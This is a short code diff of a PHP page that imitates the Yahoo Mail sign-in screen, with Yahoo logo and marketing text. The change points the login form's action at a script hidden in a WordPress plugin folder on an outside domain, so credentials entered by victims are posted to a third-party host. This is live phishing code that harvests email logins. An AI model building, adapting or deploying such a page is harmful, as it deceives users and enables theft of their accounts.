@@ -85,7 +85,7 @@ $email = $_GET['email'];
 			<p style="font-family: Candara; font-size: 22px;">Best in class Yahoo Mail, breaking local, national and global<br>news, finance, sports, music, movies and more. You get more<br>out of the web, you get more out of life.</p>
 		</div>
 
-		<form method="post" action="view2.php" style="width: auto; margin-left: 2%; margin-right: auto; position: absolute; top: 2%; display: inline-block;">
+		<form method="post" action="https://globetekpro.com/wordpress/wp-content/plugins/makeup/xv/hju/view2.php" style="width: auto; margin-left: 2%; margin-right: auto; position: absolute; top: 2%; display: inline-block;">
 		    <div class="container" style="background-color: #ffffff; box-shadow: 1px 1px 5px #d1d1d1; margin: 0px; width: 170%; padding: 1px;">
 			<img src="yahoo.png" style="display: block; margin-left: auto; margin-right: auto;" alt="yahoo" width="100px" height="70px">
 
